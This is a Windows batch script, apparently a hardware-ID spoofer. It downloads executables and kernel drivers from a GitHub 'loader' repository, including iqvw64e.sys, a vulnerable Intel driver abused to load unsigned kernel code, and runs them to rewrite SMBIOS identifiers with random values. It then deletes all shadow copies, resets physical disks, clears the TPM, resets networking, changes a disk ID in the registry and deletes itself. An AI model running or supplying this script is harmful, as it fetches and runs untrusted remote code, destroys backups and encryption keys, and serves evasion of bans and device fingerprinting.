@echo off
setlocal EnableDelayedExpansion

:: Set save location
set "targetDir=C:\Windows\apppatch\Custom\Custom64"

:: Download files
bitsadmin /transfer get1 /priority foreground ^
 https://github.com/msxredx11/loader/raw/refs/heads/main/H2OSDE-W.exe ^
 "%targetDir%\H2OSDE-W.exe"
bitsadmin /transfer get2 /priority foreground ^
 https://github.com/msxredx11/loader/raw/refs/heads/main/Solution.exe ^
 "%targetDir%\Solution.exe"
bitsadmin /transfer get3 /priority foreground ^
 https://github.com/msxredx11/loader/raw/refs/heads/main/Solution64.sys ^
 "%targetDir%\Solution64.sys"
bitsadmin /transfer get4 /priority foreground ^
 https://github.com/msxredx11/loader/raw/refs/heads/main/iqvw64e.sys ^
 "%targetDir%\iqvw64e.sys"
bitsadmin /transfer get5 /priority foreground ^
 https://github.com/msxredx11/loader/raw/refs/heads/main/winxsrcsv64.exe ^
 "%targetDir%\winxsrcsv64.exe"
bitsadmin /transfer get6 /priority foreground ^
 https://github.com/msxredx11/loader/raw/refs/heads/main/winxsrcsv64.sys ^
 "%targetDir%\winxsrcsv64.sys"

cd /d "%targetDir%"

:: Generate consistent random values
set /a iv_num=%random% %% 50 + 1
set /a year=%random% %% 9 + 2016
set /a month=%random% %% 12 + 1
set /a day=%random% %% 28 + 1
if %month% LSS 10 set month=0%month%
if %day% LSS 10 set day=0%day%
set id_date=%year%-%month%-%day%

:: Generate random serial
set "serial="
for /l %%i in (1,1,6) do (
    set /a digit=!random! %% 10
    set "serial=!serial!!digit!"
)

:: Random chipset selection
set chipset[0]=B450
set chipset[1]=B550
set chipset[2]=B650
set /a chip_index=!random! %% 3
set chipset=!chipset[%chip_index%]!

:: Use consistent brand for legacy compatibility
set "brand=Gigabyte"

:: Spoofing using Solution.exe
Solution.exe /IVN "American Megatrends Inc."
Solution.exe /IV "!iv_num! b"
Solution.exe /ID "!id_date!"
Solution.exe /SM "%brand% Technology Co.,Ltd."
Solution.exe /SP "To be filled by O.E.M."
Solution.exe /SV "To be filled by O.E.M."
Solution.exe /SS "YLJC!serial!"
Solution.exe /SU "auto"
Solution.exe /SK "To be filled by O.E.M."
Solution.exe /SF "To be filled by O.E.M."
Solution.exe /BM "%brand% Technology Co. Ltd."
Solution.exe /BP "!chipset!M AORUS"
Solution.exe /BV "x.x"
Solution.exe /BS "To be filled by O.E.M."
Solution.exe /BT "To be filled by O.E.M."
Solution.exe /CM "%brand% Technology Co. Ltd."
Solution.exe /CT "03"
Solution.exe /CV "To be filled by O.E.M."
Solution.exe /CS "To be filled by O.E.M."
Solution.exe /CA "To be filled by O.E.M."
Solution.exe /CO "00000000"
Solution.exe /CSK "To be filled by O.E.M."
Solution.exe /PSN " "
Solution.exe /PAT "Fill By OEM"
Solution.exe /PPN "Fill By OEM"

:: Repeat with winxsrcsv64.exe
winxsrcsv64.exe /IVN "American Megatrends Inc."
winxsrcsv64.exe /IV "!iv_num! b"
winxsrcsv64.exe /ID "!id_date!"
winxsrcsv64.exe /SM "%brand% Technology Co.,Ltd."
winxsrcsv64.exe /SP "To be filled by O.E.M."
winxsrcsv64.exe /SV "To be filled by O.E.M."
winxsrcsv64.exe /SS "YLJC!serial!"
winxsrcsv64.exe /SU "auto"
winxsrcsv64.exe /SK "To be filled by O.E.M."
winxsrcsv64.exe /SF "To be filled by O.E.M."
winxsrcsv64.exe /BM "%brand% Technology Co. Ltd."
winxsrcsv64.exe /BP "!chipset!M AORUS"
winxsrcsv64.exe /BV "x.x"
winxsrcsv64.exe /BS "To be filled by O.E.M."
winxsrcsv64.exe /BT "To be filled by O.E.M."
winxsrcsv64.exe /CM "%brand% Technology Co. Ltd."
winxsrcsv64.exe /CT "03"
winxsrcsv64.exe /CV "To be filled by O.E.M."
winxsrcsv64.exe /CS "To be filled by O.E.M."
winxsrcsv64.exe /CA "To be filled by O.E.M."
winxsrcsv64.exe /CO "00000000"
winxsrcsv64.exe /CSK "To be filled by O.E.M."
winxsrcsv64.exe /PSN " "
winxsrcsv64.exe /PAT "Fill By OEM"
winxsrcsv64.exe /PPN "Fill By OEM"

:: Cleanup and network reset
ipconfig /flushdns >nul
powershell vssadmin delete shadows /all >nul
powershell Reset-PhysicalDisk * >nul
powershell.exe Clear-Tpm
powershell.exe Disable-TpmAutoProvisioning
netsh interface set interface "Ethernet" admin=enable
ipconfig /flushdns
ipconfig /registerdns
ipconfig /release
ipconfig /renew

powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "UDP Checksum Offload (IPv6)" -DisplayValue "Disabled"
powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "TCP Checksum Offload (IPv6)" -DisplayValue "Disabled"
powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "Large Send Offload v2 (IPv6)" -DisplayValue "Disabled"
powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "IPv4 Checksum Offload" -DisplayValue "Disabled"
powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "Flow Control" -DisplayValue "Disabled"
powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "ARP Offload" -DisplayValue "Disabled"
powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "Network Address" -DisplayValue "Not Present"
powershell.exe Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "Energy Efficient Ethernet" -DisplayValue "Disabled"

ipconfig /flushdns >nul
netsh int ip reset >nul
netsh int ipv4 reset >nul
netsh int ipv6 reset >nul
reg add "HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\MultifunctionAdapter\0\DiskController\0\DiskPeripheral\0" /v Identifier /t REG_SZ /d %random%-%random% /f

powershell vssadmin delete shadows /all >nul

:: Self-delete
DEL "%~f0"
